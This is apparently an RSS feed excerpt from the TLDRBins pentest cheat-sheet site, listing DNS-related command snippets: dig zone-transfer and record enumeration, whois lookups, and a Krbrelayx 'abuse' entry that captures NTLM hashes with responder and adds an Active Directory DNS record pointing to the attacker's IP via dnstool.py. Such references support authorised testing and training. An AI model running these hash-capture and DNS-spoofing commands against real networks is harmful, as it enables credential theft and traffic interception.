channel.title: Dns on TLDRBins
channel.description: Recent content in Dns on TLDRBins

item.title: DNS Enum
item.description: Zone Transfer dig +noall +answer <DOMAIN> axfr @<TARGET> Domain Discovery dig +noall +answer @<TARGET> <DOMAIN> dig +noall +answer @<TARGET> -x <TARGET> dig +noall +answer @<TARGET> +short <DOMAIN> any dig +noall +answer @<TARGET> -t NS <DOMAIN>

item.title: Krbrelayx
item.description: Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 python3 dnstool.py -u '<DOMAIN>\\<USER>' -p '<PASSWORD>' --action add --record test --data <LOCAL_IP> --type A <DOMAIN> Ref: krbrelayx tools

item.title: whois
item.description: WHOIS # General whois <DOMAIN> # With specific server whois -h <WHOIS_SERVER> -p 43 <DOMAIN>
